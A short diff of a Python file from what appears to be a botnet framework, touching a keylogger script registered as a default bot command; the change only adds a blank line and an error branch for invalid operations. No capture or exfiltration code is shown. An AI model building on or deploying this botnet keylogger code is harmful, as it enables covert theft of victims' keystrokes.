@@ -10,6 +10,7 @@ from ..utils import simple_serializer
 
 _logger = logging.getLogger(f"--> {__name__}  ")
 
+
 @BotNet.default_script(script_version="0.0.1")
 def keylogger(context: Context) -> str:
     """
@@ -72,6 +73,9 @@ def keylogger(context: Context) -> str:
 
         except:
             return "keylogger is already off"
+
+    else:
+        return f"keylogger Invalid operation {command[0]}"
 
 
 class KeyLogger:
